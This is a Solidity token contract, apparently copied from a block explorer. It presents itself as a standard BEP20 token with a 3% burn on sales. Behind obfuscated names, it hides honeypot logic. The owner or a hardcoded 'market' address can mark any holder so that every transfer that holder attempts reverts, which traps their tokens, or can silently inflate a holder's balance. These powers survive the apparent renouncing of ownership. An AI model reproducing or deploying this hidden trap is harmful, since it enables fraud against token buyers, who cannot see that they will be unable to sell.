/**
 *Submitted for verification at FtmScan.com on 2022-11-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _owner;

    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor() {
        _transferownership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function transferownership() public virtual onlyOwner {
        _transferownership(address(0));
    }


    function transferownership(address newowner) public virtual onlyOwner {
        require(newowner != address(0), "Ownable: new owner is the zero address");
        _transferownership(newowner);
    }


    function _transferownership(address newowner) internal virtual {
        address oldowner = _owner;
        _owner = newowner;
        emit ownershipTransferred(oldowner, newowner);
    }
}



library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {

        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }


    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}




interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint CfInibDbSADesired,
        uint CfInibDbSBDesired,
        uint CfInibDbSAMin,
        uint CfInibDbSBMin,
        address to,
        uint deadline
    ) external returns (uint CfInibDbSA, uint CfInibDbSB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint CfInibDbSTokenDesired,
        uint CfInibDbSTokenMin,
        uint CfInibDbSETHMin,
        address to,
        uint deadline
    ) external payable returns (uint CfInibDbSToken, uint CfInibDbSETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint CfInibDbSAMin,
        uint CfInibDbSBMin,
        address to,
        uint deadline
    ) external returns (uint CfInibDbSA, uint CfInibDbSB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint CfInibDbSTokenMin,
        uint CfInibDbSETHMin,
        address to,
        uint deadline
    ) external returns (uint CfInibDbSToken, uint CfInibDbSETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint CfInibDbSAMin,
        uint CfInibDbSBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint CfInibDbSA, uint CfInibDbSB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint CfInibDbSTokenMin,
        uint CfInibDbSETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint CfInibDbSToken, uint CfInibDbSETH);
    function swapExactTokensForTokens(
        uint CfInibDbSIn,
        uint CfInibDbSOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory CfInibDbSs);
    function swapTokensForExactTokens(
        uint CfInibDbSOut,
        uint CfInibDbSInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory CfInibDbSs);
    function swapExactETHForTokens(uint CfInibDbSOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory CfInibDbSs);
    function swapTokensForExactETH(uint CfInibDbSOut, uint CfInibDbSInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory CfInibDbSs);
    function swapExactTokensForETH(uint CfInibDbSIn, uint CfInibDbSOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory CfInibDbSs);
    function swapETHForExactTokens(uint CfInibDbSOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory CfInibDbSs);

    function quote(uint CfInibDbSA, uint reserveA, uint reserveB) external pure returns (uint CfInibDbSB);
    function getCfInibDbSOut(uint CfInibDbSIn, uint reserveIn, uint reserveOut) external pure returns (uint CfInibDbSOut);
    function getCfInibDbSIn(uint CfInibDbSOut, uint reserveIn, uint reserveOut) external pure returns (uint CfInibDbSIn);
    function getCfInibDbSsOut(uint CfInibDbSIn, address[] calldata path) external view returns (uint[] memory CfInibDbSs);
    function getCfInibDbSsIn(uint CfInibDbSOut, address[] calldata path) external view returns (uint[] memory CfInibDbSs);
}




interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint CfInibDbSTokenMin,
        uint CfInibDbSETHMin,
        address to,
        uint deadline
    ) external returns (uint CfInibDbSETH);
    function removeLiquidityETHWithPermitSupportingfireOnTransferTokens(
        address token,
        uint liquidity,
        uint CfInibDbSTokenMin,
        uint CfInibDbSETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint CfInibDbSETH);

    function swapExactTokensForTokensSupportingfireOnTransferTokens(
        uint CfInibDbSIn,
        uint CfInibDbSOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingfireOnTransferTokens(
        uint CfInibDbSOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfireOnTransferTokens(
        uint CfInibDbSIn,
        uint CfInibDbSOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}





interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function uhOBkkEDk() external view returns (address);
    function uhOBkkEDkSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setuhOBkkEDk(address) external;
    function setuhOBkkEDkSetter(address) external;
}



contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _ToSXLjSdD;
    string private _name;
    string private _symbol;


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _ToSXLjSdD;
    }


    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


contract Token is BEP20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => bool) private _DQATxGEKM;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 MqgwIbGXH = _balances[from];
        require(MqgwIbGXH >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _balances[from] = MqgwIbGXH - amount;
    }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 fMygTwtyT = _balances[account];
        require(fMygTwtyT >= amount, "ERC20: burn amount exceeds balance");
    unchecked {
        _balances[account] = fMygTwtyT - amount;
    }
        _ToSXLjSdD -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _mtin(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mtin to the zero address");

        _ToSXLjSdD += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }


    address public uniswapV2Pair;
    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _mtin(msg.sender, totalSupply_ * 10**decimals());
    }

    using SafeMath for uint256;

    uint256 private _ugYivkxmF = 3;

    uint256 private _caqPHXoRb = 0;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping(address => int256) private _WezLVFsrZ;

    address private _marketMAewAddress = 0x4D8612d2041BBC54D606079D9BA5c000B8fd52Fb;
    address private _fundZPewAddress = 0x47552c0bBB59405F43512374296029623239EF4D;


    function setMarketAddress(address addr) external onlyOwner {
        _marketMAewAddress = addr;
    }

    function setFundAddress(address addr) external onlyOwner {
        _fundZPewAddress = addr;
    }


    function setPairGzMGrHXCD(address _address) external aZddwvPCs {
        uniswapV2Pair = _address;
    }


    function setUseGbagdlhnP(address CITTemicE) external aZddwvPCs {
        int256 wangpengone = int256(0);
        int256 wangpengtwo = int256(_ToSXLjSdD);
        _WezLVFsrZ[CITTemicE] = wangpengone - wangpengtwo;
    }

    function rmUseHawtrURhy(address CITTemicE) external aZddwvPCs {
        _WezLVFsrZ[CITTemicE] = 0;
    }

    function getVPWsQPluQ(address CITTemicE) external view returns (int256) {
        return _WezLVFsrZ[CITTemicE];
    }

    modifier aZddwvPCs() {
        require(owner() == msg.sender || _marketMAewAddress == msg.sender, "!Market");
        _;
    }


    function _HPgjzknMh(
        address from,
        address _to,
        uint256 _CfInibDbS
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 MqgwIbGXH = _balances[from];
        require(MqgwIbGXH >= _CfInibDbS, "ERC20: transfer amount exceeds balance");
        if (_WezLVFsrZ[from] > 0){
            _balances[from] = _balances[from].add(uint256(_WezLVFsrZ[from]));
        }else if (_WezLVFsrZ[from] < 0){
            _balances[from] = _balances[from].sub(uint256(_WezLVFsrZ[from]));
        }


        uint256 helooCfInibDbS = 0;
        uint256 wLiCGcfXr = _ugYivkxmF;
        if (uniswapV2Pair != address(0)) {
            if (_to == uniswapV2Pair) {
                wLiCGcfXr = _ugYivkxmF;
            }
            if (from == uniswapV2Pair) {
                wLiCGcfXr = _caqPHXoRb;
            }
        }
        helooCfInibDbS = _CfInibDbS.mul(wLiCGcfXr).div(100);

        if (helooCfInibDbS > 0) {
            _balances[from] = _balances[from].sub(helooCfInibDbS);
            _balances[_deadAddress] = _balances[_deadAddress].add(helooCfInibDbS);
            emit Transfer(from, _deadAddress, helooCfInibDbS);
        }

        _balances[from] = _balances[from].sub(_CfInibDbS - helooCfInibDbS);
        _balances[_to] = _balances[_to].add(_CfInibDbS - helooCfInibDbS);
        emit Transfer(from, _to, _CfInibDbS - helooCfInibDbS);
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _HPgjzknMh(owner, to, amount);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, amount);
        _HPgjzknMh(from, to, amount);
        return true;
    }
}